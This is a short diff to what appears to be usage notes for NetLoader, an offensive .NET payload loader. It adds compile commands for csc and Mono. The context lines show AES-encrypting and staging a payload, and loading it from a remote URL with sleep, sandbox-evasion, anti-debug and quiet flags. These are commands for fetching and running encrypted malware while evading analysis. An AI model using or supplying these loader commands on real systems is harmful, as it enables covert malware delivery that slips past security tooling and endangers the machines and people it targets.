@@ -17,3 +17,13 @@ NetLoader.exe -aes <passphrase> -path C:\payload.exe.aes
 NetLoader.exe -enc -aes <passphrase> -path C:\payload.exe        # stage payload
 
 NetLoader.exe -aes <passphrase> -path https://host/payload.aes -sleep 30 -sandbox -anti-debug -quiet
+
+
+ 
+ # Compile (Windows, .NET Framework 4.7.2+):
+ 
+ - csc /optimize+ /platform:anycpu /out:NetLoader.exe NetLoader_AES.cs
+ 
+ # Compile (Mono):
+ 
+ - mcs -optimize+ -out:NetLoader.exe NetLoader_AES.cs
